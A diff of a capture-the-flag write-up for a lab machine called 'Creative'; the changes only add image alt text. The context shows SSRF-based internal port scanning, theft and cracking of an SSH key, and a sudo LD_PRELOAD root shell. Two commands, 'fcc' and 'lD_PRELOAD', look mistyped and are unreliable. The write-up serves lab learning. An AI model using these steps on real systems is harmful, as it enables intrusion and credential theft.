@@ -33,13 +33,13 @@ nmap -A -p- TARGET --min-rate 10000 -oN creatve.nmap
 | 22       | ssh         |
 | 80       | http        |
 
-![](https://cdn.ziomsec.com/creative/1.webp)
+![performing an nmap scan on creative machine](https://cdn.ziomsec.com/creative/1.webp)
 
 ## Initial Foothold
 
 I was able to discover a web server running so I added the IP in my `/etc/hosts` file and accessed the web server through my browser.
 
-![](https://cdn.ziomsec.com/creative/2.webp)
+![accessing the web application](https://cdn.ziomsec.com/creative/2.webp)
 
 I tried looking for files, directories but found nothing. I then enumerated subdomains and found 1.
 
@@ -47,11 +47,11 @@ I tried looking for files, directories but found nothing. I then enumerated subd
 ffuf -u http://creative.thm -H 'Host: FUZZ.creative.thm' -w /usr/share/wordlists/seclists/Discover/DNS/subdomain-top1million-110000.txt -fw 6
 ```
 
-![](https://cdn.ziomsec.com/creative/3.webp)
+![fuzzing subdomains](https://cdn.ziomsec.com/creative/3.webp)
 
 After adding the subdomain in the **`hosts`** file, I accessed it and found an interesting feature. It allowed us to send request to a website to see if it is active.
 
-![](https://cdn.ziomsec.com/creative/4.webp)
+![accessing the subdomain](https://cdn.ziomsec.com/creative/4.webp)
 
 I started an **http** server on my local system and tried accessing it through the application.
 
@@ -59,35 +59,35 @@ I started an **http** server on my local system and tried accessing it through t
 python3 -m http.server 80
 ```
 
-![](https://cdn.ziomsec.com/creative/5.webp)
+![accessing the local server](https://cdn.ziomsec.com/creative/5.webp)
 
-![](https://cdn.ziomsec.com/creative/6.webp)
+![accessing the local server](https://cdn.ziomsec.com/creative/6.webp)
 
 Since I was able to make the server send requests, I tried using it to execute php, js, python payloads but none of them seemed to work. The application simply displayed the contents of the files. Out of curiosity, I tried accessing the localhost and found the rendered html of the domain.
 
 I then fired up Burp and tried analyzing it in an efficient manner.
 
-![](https://cdn.ziomsec.com/creative/7.webp)
+![attempting to access localhost url](https://cdn.ziomsec.com/creative/7.webp)
 
 So, if the page existed, I would get the rendered contents of the page else, I would receive an error. I exploited this behavior to scan internal ports using intruder.
 
-![](https://cdn.ziomsec.com/creative/8.webp)
+![configuring intruder payload position](https://cdn.ziomsec.com/creative/8.webp)
 
-![](https://cdn.ziomsec.com/creative/9.webp)
+![configuring intruder payloads](https://cdn.ziomsec.com/creative/9.webp)
 
-![](https://cdn.ziomsec.com/creative/10.webp)
+![running intruder attack](https://cdn.ziomsec.com/creative/10.webp)
 
 I found port 1337 to be hosting the root directory.
 
-![](https://cdn.ziomsec.com/creative/11.webp)
+![accessing port 1337](https://cdn.ziomsec.com/creative/11.webp)
 
 I was then able to access the user flag from *saad*'s home directory.
 
-![](https://cdn.ziomsec.com/creative/12.webp)
+![capturing the user flag](https://cdn.ziomsec.com/creative/12.webp)
 
 I also found `saad`'s **ssh** keys and copied the private key onto my local system.
 
-![](https://cdn.ziomsec.com/creative/13.webp)
+![accessing the ssh key](https://cdn.ziomsec.com/creative/13.webp)
 
 I tried logging in using the private key but was prompted for a passphrase. So, I converted the key to **john** crackable format and cracked it using **john** the ripper.
 
@@ -95,13 +95,13 @@ I tried logging in using the private key but was prompted for a passphrase. So, 
 ssh2john PRIV.KEY > saad.hash
 ```
 
-![](https://cdn.ziomsec.com/creative/14.webp)
+![converting ssh key to john crackable format](https://cdn.ziomsec.com/creative/14.webp)
 
 ```shell
 john --wordlist=/usr/share/wordlists/rockyou.txt saad.hash
 ```
 
-![](https://cdn.ziomsec.com/creative/15.webp)
+![cracking the passphrase of ssh key](https://cdn.ziomsec.com/creative/15.webp)
 
 Finally, I used the passphrase to log in as *saad*.
 
@@ -109,13 +109,13 @@ Finally, I used the passphrase to log in as *saad*.
 ssh -i saad.key saad@TARGET
 ```
 
-![](https://cdn.ziomsec.com/creative/16.webp)
+![logging in as saad](https://cdn.ziomsec.com/creative/16.webp)
 
 ## Privilege Escalation
 
 I examined the contents of *saad*'s home directory and found the **.bash_history** file which could hold command history. I viewed the file and found his password.
 
-![](https://cdn.ziomsec.com/creative/17.webp)
+![viewing the bash history file](https://cdn.ziomsec.com/creative/17.webp)
 
 I then looked for my **sudo** privileges and found the following
 
@@ -123,7 +123,7 @@ I then looked for my **sudo** privileges and found the following
 sudo -l
 ```
 
-![](https://cdn.ziomsec.com/creative/18.webp)
+![viewing sudo privs](https://cdn.ziomsec.com/creative/18.webp)
 
 The **ping** permission in itself wasn't anything special. However, the environment variable `env_keep+=LD_PRELOAD` was something that could be exploited. I could make the program load a library of my choice before running the `ping` command as sudo.
 
@@ -148,7 +148,7 @@ system("/bin/bash");
 fcc -fPIC -shared -o hehe hehe.c -nostartfiles
 ```
 
-![](https://cdn.ziomsec.com/creative/19.webp)
+![creating the payload](https://cdn.ziomsec.com/creative/19.webp)
 
 Finally, I used the environment variable to load my binary before executing the **ping** command as **sudo** and spawned a **bash** shell as **root**.
 
@@ -156,7 +156,7 @@ Finally, I used the environment variable to load my binary before executing the 
 sudo lD_PRELOAD=/home/saad/hehe ping
 ```
 
-![](https://cdn.ziomsec.com/creative/20.webp)
+![running the payload](https://cdn.ziomsec.com/creative/20.webp)
 
 I then captured the root flag from **`/root`**
 
@@ -164,6 +164,6 @@ I then captured the root flag from **`/root`**
 cat /root/root.txt
 ```
 
-![](https://cdn.ziomsec.com/creative/21.webp)
+![capturing the root flag](https://cdn.ziomsec.com/creative/21.webp)
 
 ---
